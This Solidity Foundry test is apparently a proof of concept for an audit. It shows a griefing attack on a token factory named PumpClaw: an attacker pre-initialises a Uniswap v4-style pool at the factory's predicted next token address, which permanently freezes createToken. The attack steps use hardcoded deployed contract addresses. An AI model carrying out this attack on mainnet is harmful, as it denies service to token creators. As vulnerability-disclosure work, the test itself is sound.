// SAFE, LOCAL FORK ONLY. No mainnet state touched.
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

interface IPumpClawFactory {
    function createToken(
        string calldata name,
        string calldata symbol,
        string calldata imageUrl,
        string calldata websiteUrl,
        uint256 totalSupply,
        uint256 initialFdv,
        address creator
    ) external returns (address token, uint256 positionId);

    function getTokenCount() external view returns (uint256);
}

interface IPoolManager {
    function initialize(PoolKey calldata key, uint160 sqrtPriceX96) external returns (int24 tick);
}

/// @dev Predict next CREATE address, pre-init pool, then createToken permanently fails
/// (CurrencyNotSettled). Revert rolls back factory nonce so the same address is re-used → pad freeze.
contract CreateAfterPreInitTest is Test {
    address constant FACTORY = 0xfa4B952c15BC9d418ae4f552F7Fc76b4470596fE;
    address constant POOL_MANAGER = 0x8366a39CC670B4001A1121B8F6A443A643e40951;
    uint24 constant LP_FEE = 10000;
    int24 constant TICK_SPACING = 200;

    address attacker = address(0xA11CE);
    address creator = address(0xC0FFEE);

    // CurrencyNotSettled()
    bytes4 constant CURRENCY_NOT_SETTLED = 0x5212cba1;

    function setUp() public {
        vm.deal(attacker, 50 ether);
        vm.deal(creator, 10 ether);
    }

    function test_preInit_freezes_createToken() public {
        uint64 nonce = vm.getNonce(FACTORY);
        address predicted = vm.computeCreateAddress(FACTORY, nonce);
        console.log("factory nonce", nonce);
        console.log("predicted token", predicted);

        PoolKey memory key = PoolKey(address(0), predicted, LP_FEE, TICK_SPACING, address(0));
        uint160 attackPrice = 79228162514264337593543950336;

        vm.prank(attacker);
        IPoolManager(POOL_MANAGER).initialize(key, attackPrice);

        uint256 before = IPumpClawFactory(FACTORY).getTokenCount();

        // First create attempt reverts
        vm.prank(creator);
        vm.expectRevert(abi.encodeWithSelector(CURRENCY_NOT_SETTLED));
        IPumpClawFactory(FACTORY).createToken(
            "PreInit", "PI", "ipfs://x", "https://example.com", 1_000_000_000e18, 20 ether, creator
        );

        // Nonce unchanged after full tx revert → same predicted address
        assertEq(vm.getNonce(FACTORY), nonce, "nonce rolled back");
        assertEq(IPumpClawFactory(FACTORY).getTokenCount(), before, "no token registered");

        // Retry also fails → permanent freeze of this factory's next CREATE slot
        vm.prank(creator);
        vm.expectRevert(abi.encodeWithSelector(CURRENCY_NOT_SETTLED));
        IPumpClawFactory(FACTORY).createToken(
            "PreInit2", "PI2", "ipfs://y", "https://example.com", 1_000_000_000e18, 20 ether, creator
        );

        assertEq(vm.getNonce(FACTORY), nonce, "still frozen on same nonce");
        console.log("createToken permanently frozen after pool pre-init");
    }
}
